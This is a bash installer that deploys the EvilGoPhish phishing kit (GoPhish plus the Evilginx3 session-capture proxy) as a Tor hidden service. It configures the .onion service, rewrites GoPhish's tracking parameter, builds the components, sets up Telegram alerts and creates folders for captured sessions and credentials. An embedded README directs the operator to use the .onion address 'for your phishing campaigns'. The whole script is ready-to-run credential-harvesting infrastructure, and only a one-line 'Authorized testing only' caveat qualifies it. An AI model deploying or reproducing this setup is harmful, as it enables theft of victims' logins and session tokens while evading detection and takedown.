#!/usr/bin/env bash

# EvilGoPhish Setup Script for Ubuntu VPS with Hidden Services
# This script sets up the entire system for hidden service phishing

set -e

script_name="evilgophish hidden services setup"

function check_privs () {
    if [[ "$(whoami)" != root ]]; then
        print_error "You need root privileges to run this script."
        exit 1
    fi
}

function print_good () {
    echo -e "[${script_name}] \x1B[01;32m[+]\x1B[0m $1"
}

function print_error () {
    echo -e "[${script_name}] \x1B[01;31m[-]\x1B[0m $1"
}

function print_warning () {
    echo -e "[${script_name}] \x1B[01;33m[!]\x1B[0m $1"
}

function print_info () {
    echo -e "[${script_name}] \x1B[01;34m[*]\x1B[0m $1"
}

if [[ $# -lt 2 ]]; then
    print_error "Missing Parameters:"
    print_error "Usage:"
    print_error './setup_hidden_services.sh <onion_domain> <rid_replacement> [telegram_bot_token] [telegram_chat_id]'
    print_error " - onion_domain         - your .onion domain for the hidden service"
    print_error " - rid_replacement      - replace the gophish default \"rid\" in URLs (e.g., user_id)"
    print_error " - telegram_bot_token   - (optional) your Telegram bot token"
    print_error " - telegram_chat_id     - (optional) your Telegram chat ID"
    print_error "Example:"
    print_error '  ./setup_hidden_services.sh abc123xyz456.onion user_id'
    print_error '  ./setup_hidden_services.sh abc123xyz456.onion user_id 123456:ABC-DEF -987654321'
    exit 2
fi

# Set variables from parameters
onion_domain="${1}"
rid_replacement="${2}"
telegram_bot_token="${3:-}"
telegram_chat_id="${4:-}"
INSTALL_DIR="/opt/evilgophish"
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

print_info "EvilGoPhish Hidden Services Setup"
print_info "===================================="
print_info "Onion Domain: $onion_domain"
print_info "RID Parameter: $rid_replacement"
print_info "Installation Directory: $INSTALL_DIR"

# Install dependencies
function install_depends () {
    print_info "Updating system and installing dependencies..."
    apt-get update
    apt-get install -y \
        build-essential \
        wget \
        git \
        net-tools \
        tmux \
        openssl \
        jq \
        tor \
        curl \
        systemd
    print_good "Dependencies installed!"
}

# Install Go
function install_go () {
    print_info "Installing Go from source..."
    if command -v go &> /dev/null; then
        GO_VERSION=$(go version | awk '{print $3}')
        print_info "Go is already installed: $GO_VERSION"
    else
        v=$(curl -s https://go.dev/dl/?mode=json | jq -r '.[0].version')
        wget https://go.dev/dl/"${v}".linux-amd64.tar.gz
        tar -C /usr/local -xzf "${v}".linux-amd64.tar.gz
        ln -sf /usr/local/go/bin/go /usr/bin/go
        rm "${v}".linux-amd64.tar.gz
        print_good "Go installed: $v"
    fi
}

# Configure Tor for hidden service
function setup_tor () {
    print_info "Configuring Tor hidden service..."
    
    # Backup original torrc if exists
    if [ -f /etc/tor/torrc ]; then
        cp /etc/tor/torrc /etc/tor/torrc.backup.$(date +%Y%m%d_%H%M%S)
    fi
    
    # Add hidden service configuration
    cat >> /etc/tor/torrc <<EOF

# EvilGoPhish Hidden Service Configuration
HiddenServiceDir /var/lib/tor/evilgophish/
HiddenServicePort 80 127.0.0.1:443
HiddenServicePort 443 127.0.0.1:443

# Security hardening
RunAsDaemon 1
Log notice file /var/log/tor/notices.log
DataDirectory /var/lib/tor
EOF

    # Create hidden service directory
    mkdir -p /var/lib/tor/evilgophish
    chown -R debian-tor:debian-tor /var/lib/tor/evilgophish
    chmod 700 /var/lib/tor/evilgophish
    
    # Restart Tor
    systemctl restart tor
    sleep 5
    
    # Get the onion address
    if [ -f /var/lib/tor/evilgophish/hostname ]; then
        ONION_ADDRESS=$(cat /var/lib/tor/evilgophish/hostname)
        print_good "Tor hidden service configured!"
        print_good "Your .onion address: $ONION_ADDRESS"
        print_info "Make sure to use this address for your phishing campaigns"
    else
        print_error "Failed to generate .onion address. Check Tor logs."
    fi
}

# Setup installation directory
function setup_install_dir () {
    print_info "Setting up installation directory..."
    
    if [ "$SCRIPT_DIR" != "$INSTALL_DIR" ]; then
        print_info "Copying files to $INSTALL_DIR..."
        mkdir -p "$INSTALL_DIR"
        cp -r "$SCRIPT_DIR"/* "$INSTALL_DIR/"
        cd "$INSTALL_DIR"
    else
        print_info "Already in installation directory"
        cd "$INSTALL_DIR"
    fi
    
    # Create necessary directories
    mkdir -p reports/{sessions,credentials,raw}
    mkdir -p logs
    
    print_good "Installation directory ready"
}

# Build components
function build_components () {
    print_info "Building EvilGoPhish components..."
    
    # Build GoPhish
    print_info "Building GoPhish..."
    cd "$INSTALL_DIR/gophish"
    # Replace RID parameter
    find . -type f -exec sed -i "s|client_id|${rid_replacement}|g" {} \;
    go build
    print_good "GoPhish built successfully"
    
    # Build Evilginx3
    print_info "Building Evilginx3..."
    cd "$INSTALL_DIR/evilginx3"
    go build -o evilginx3
    print_good "Evilginx3 built successfully"
    
    # Build EvilFeed
    print_info "Building EvilFeed..."
    cd "$INSTALL_DIR/evilfeed"
    go build
    print_good "EvilFeed built successfully"
    
    # Build Report Monitor
    print_info "Building Report Monitor..."
    cd "$INSTALL_DIR/report_monitor"
    go build -o report_monitor
    print_good "Report Monitor built successfully"
    
    cd "$INSTALL_DIR"
}

# Configure Telegram notifications
function setup_telegram () {
    print_info "Configuring Telegram notifications..."
    
    if [ -n "$telegram_bot_token" ] && [ -n "$telegram_chat_id" ]; then
        cat > "$INSTALL_DIR/telegram_config.json" <<EOF
{
  "bot_token": "${telegram_bot_token}",
  "chat_id": "${telegram_chat_id}",
  "enabled": true
}
EOF
        chmod 600 "$INSTALL_DIR/telegram_config.json"
        print_good "Telegram notifications configured and enabled"
    else
        cat > "$INSTALL_DIR/telegram_config.json" <<EOF
{
  "bot_token": "YOUR_BOT_TOKEN_HERE",
  "chat_id": "YOUR_CHAT_ID_HERE",
  "enabled": false
}
EOF
        print_warning "Telegram credentials not provided. Created template config."
        print_info "Edit telegram_config.json to enable Telegram notifications"
    fi
}

# Configure for hidden services
function configure_hidden_services () {
    print_info "Configuring for hidden services..."
    
    # Update GoPhish config for local operation
    cd "$INSTALL_DIR/gophish"
    
    if [ -f config.json ]; then
        # Enable feed if not already
        sed -i 's/"feed_enabled": false/"feed_enabled": true/g' config.json
        print_good "GoPhish configured for hidden services"
    fi
    
    cd "$INSTALL_DIR"
}

# Install systemd services
function install_systemd_services () {
    print_info "Installing systemd services..."
    
    # Update WorkingDirectory in service file
    sed -i "s|/opt/evilgophish|${INSTALL_DIR}|g" "$INSTALL_DIR/systemd/evilgophish.service"
    
    # Copy service files
    cp "$INSTALL_DIR/systemd/evilgophish.service" /etc/systemd/system/
    cp "$INSTALL_DIR/systemd/evilgophish.timer" /etc/systemd/system/
    
    # Reload systemd
    systemctl daemon-reload
    
    print_good "Systemd services installed"
    print_info "To enable automatic startup: systemctl enable evilgophish.timer"
    print_info "To start now: systemctl start evilgophish.service"
    print_info "To enable 2-hour timer: systemctl enable --now evilgophish.timer"
}

# Create usage documentation
function create_docs () {
    print_info "Creating documentation..."
    
    cat > "$INSTALL_DIR/HIDDEN_SERVICES_README.md" <<'EOF'
# EvilGoPhish for Hidden Services

## Quick Start

### Manual Start
```bash
cd /opt/evilgophish
./start_all.sh
```

### Stop Services
```bash
cd /opt/evilgophish
./stop_all.sh
```

### Systemd Service Management

#### Start service once:
```bash
systemctl start evilgophish.service
```

#### Enable automatic start on boot:
```bash
systemctl enable evilgophish.service
```

#### Enable 2-hour timer:
```bash
systemctl enable evilgophish.timer
systemctl start evilgophish.timer
```

#### Check status:
```bash
systemctl status evilgophish.service
systemctl status evilgophish.timer
```

#### View logs:
```bash
journalctl -u evilgophish.service -f
tail -f /opt/evilgophish/logs/*.log
```

## Configuration

### Telegram Notifications
Edit `/opt/evilgophish/telegram_config.json`:
```json
{
  "bot_token": "YOUR_BOT_TOKEN",
  "chat_id": "YOUR_CHAT_ID",
  "enabled": true
}
```

### GoPhish Access
- URL: https://localhost:3333
- Default credentials: Check gophish documentation

### EvilFeed Access
- URL: http://localhost:1337

## Reports

All captured sessions and credentials are stored in:
- `/opt/evilgophish/reports/sessions/` - Complete session data
- `/opt/evilgophish/reports/credentials/` - Quick credential reference
- `/opt/evilgophish/reports/raw/` - Raw data dumps

## Hidden Service

Your Tor hidden service address:
```
cat /var/lib/tor/evilgophish/hostname
```

Use this .onion address for your phishing campaigns.

## Troubleshooting

### Check if Tor is running:
```bash
systemctl status tor
```

### Check if all components are running:
```bash
ps aux | grep -E "gophish|evilginx|evilfeed"
```

### View component logs:
```bash
ls -la /opt/evilgophish/logs/
```
EOF

    print_good "Documentation created: $INSTALL_DIR/HIDDEN_SERVICES_README.md"
}

# Main installation flow
function main () {
    check_privs
    install_depends
    install_go
    setup_tor
    setup_install_dir
    build_components
    configure_hidden_services
    setup_telegram
    install_systemd_services
    create_docs
    
    print_good "============================================"
    print_good "Installation complete!"
    print_good "============================================"
    print_info ""
    print_info "Next steps:"
    print_info "1. Review your .onion address:"
    print_info "   cat /var/lib/tor/evilgophish/hostname"
    print_info ""
    print_info "2. Configure Telegram (optional):"
    print_info "   nano $INSTALL_DIR/telegram_config.json"
    print_info ""
    print_info "3. Start services:"
    print_info "   systemctl start evilgophish.service"
    print_info ""
    print_info "4. Enable 2-hour timer:"
    print_info "   systemctl enable --now evilgophish.timer"
    print_info ""
    print_info "5. Access GoPhish:"
    print_info "   https://localhost:3333"
    print_info ""
    print_info "6. Read the documentation:"
    print_info "   cat $INSTALL_DIR/HIDDEN_SERVICES_README.md"
    print_info ""
    print_good "Happy phishing! (Authorized testing only)"
}

main
